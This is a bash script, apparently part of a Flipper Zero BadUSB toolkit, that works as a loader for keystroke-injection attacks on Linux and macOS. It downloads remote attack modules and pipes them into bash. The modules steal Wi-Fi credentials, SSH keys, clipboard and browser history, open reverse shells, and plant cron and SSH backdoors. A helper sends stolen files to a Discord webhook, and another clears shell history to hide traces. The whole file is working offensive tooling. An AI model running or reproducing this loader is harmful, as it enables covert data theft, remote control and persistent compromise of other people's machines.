#!/bin/bash
# ============================================================
# Universal Payload Loader for Linux/macOS
# ============================================================
# This loader receives configuration via environment variables
# and dynamically loads the appropriate payload module.
#
# Usage from DuckyScript (Linux):
# STRING bash -c 'DC="webhook" M="wifi" curl -sL URL/loader.sh|bash'
#
# Variables:
#   DC  = Discord webhook URL
#   DB  = Dropbox token (optional)
#   M   = Module to load (wifi, screenshot, sysinfo, etc.)
#   IP  = Attacker IP (for reverse shells)
#   PT  = Port (for reverse shells)
#   U   = Custom URL (for some payloads)
# ============================================================

# Base URL for remote payloads
BASE_URL="${BASE_URL:-https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads}"

# Detect OS
if [[ "$OSTYPE" == "darwin"* ]]; then
    OS="macos"
else
    OS="linux"
fi

# Module mappings
declare -A MODULES
# Exfiltration
MODULES[wifi]="$OS/exfil/wifi_grabber.sh"
MODULES[screenshot]="$OS/exfil/screenshot.sh"
MODULES[sysinfo]="$OS/exfil/system_info.sh"
MODULES[clipboard]="$OS/exfil/clipboard.sh"
MODULES[ssh]="$OS/exfil/ssh_keys.sh"
MODULES[history]="$OS/exfil/browser_history.sh"
MODULES[env]="$OS/exfil/env_variables.sh"

# Execution
MODULES[shell]="$OS/execution/reverse_shell.sh"
MODULES[download]="$OS/execution/download_execute.sh"
MODULES[netcat]="$OS/execution/netcat_reverse.sh"

# Fun
MODULES[rickroll]="$OS/fun/rickroll.sh"
MODULES[wallpaper]="$OS/fun/wallpaper.sh"
MODULES[tts]="$OS/fun/text_to_speech.sh"
MODULES[cmatrix]="$OS/fun/cmatrix.sh"

# Recon
MODULES[recon]="$OS/recon/full_recon.sh"
MODULES[network]="$OS/recon/network_scan.sh"
MODULES[software]="$OS/recon/installed_software.sh"

# Persistence
MODULES[persist]="$OS/persistence/cron_backdoor.sh"
MODULES[sshkey]="$OS/persistence/ssh_backdoor.sh"

# Helper: Send to Discord
send_discord() {
    local content="$1"
    local file="$2"
    
    if [[ -z "$DC" ]]; then
        return 1
    fi
    
    if [[ -n "$file" && -f "$file" ]]; then
        curl -sF "file1=@$file" -F "payload_json={\"content\":\"$content\"}" "$DC" >/dev/null 2>&1
    else
        curl -sH "Content-Type: application/json" -d "{\"content\":\"$content\"}" "$DC" >/dev/null 2>&1
    fi
}

# Helper: Get system identifier
get_sysid() {
    echo "$(hostname)-$(whoami)"
}

# Helper: Cleanup traces
clear_traces() {
    history -c 2>/dev/null
    rm -f ~/.bash_history 2>/dev/null
}

# Export helpers for modules
export -f send_discord get_sysid clear_traces
export DC DB IP PT U BASE_URL OS

# Load and execute module
if [[ -n "$M" ]]; then
    module_path="${MODULES[$M]}"
    
    if [[ -z "$module_path" ]]; then
        # Try direct path
        module_path="$M"
    fi
    
    url="$BASE_URL/$module_path"
    
    # Download and execute
    curl -sL "$url" | bash
    
    clear_traces
fi

